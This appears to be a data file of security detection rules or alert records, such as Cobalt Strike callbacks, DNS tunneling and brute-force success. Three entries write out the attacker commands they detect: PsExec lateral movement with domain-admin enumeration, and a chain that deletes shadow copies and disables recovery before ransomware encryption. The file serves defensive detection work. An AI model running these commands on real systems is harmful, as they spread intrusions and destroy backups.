rule_name: Lateral Movement - PsExec Remote Execution
payload: psexec.exe \\10.0.2.50 -u admin -p [REDACTED] cmd.exe /c whoami && net group "Domain Admins" /domain | Targets: 10.0.2.50, 10.0.3.15, 10.0.4.17 | Service installed: PSEXESVC

rule_name: Large Outbound Data Transfer to External IP

rule_name: Ransomware Precursor - Shadow Copy Deletion
payload: cmd.exe /c vssadmin delete shadows /all /quiet && wmic shadowcopy delete && bcdedit /set {default} recoveryenabled No | Subsequently detected: mass file rename *.docx -> *.docx.locked (2,847 files in 3 minutes)

rule_name: Cobalt Strike Beacon - HTTP C2 Callback

rule_name: DNS Tunneling to Known Malicious Domain
payload: DNS query: AAAAAABBBBBBCCCCCC.malware-update.darkhost.xyz TXT | Query rate: 847 queries/min to *.malware-update.darkhost.xyz | Average subdomain length: 45 chars | Encoded payload detected in subdomain labels

rule_name: Brute Force Success - Multiple Failed Logins Followed by Auth
